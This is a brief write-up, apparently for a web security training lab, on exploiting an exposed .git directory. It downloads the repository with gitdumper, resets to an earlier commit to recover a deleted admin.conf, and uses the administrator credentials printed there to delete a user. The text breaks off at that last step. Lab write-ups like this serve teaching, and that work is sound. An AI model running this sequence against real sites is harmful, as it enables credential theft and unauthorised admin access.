Download the gitdumper script (https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh) and then the .git repo:

```
bash gitdumper.sh https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/.git/ /tmp/a/
```

There are sensitive files deleted in the latest commit:

```
cd /tmp/a
git status
```

Then we revert the previous commit and read the file:

```
git log
git reset --hard d3e84943424222ce64de7da0d797b7dfdef39ea1
cat admin.conf
```

Then we access with credentials administrator:wy0szsn75q5jqn0w70bu and delete the user:
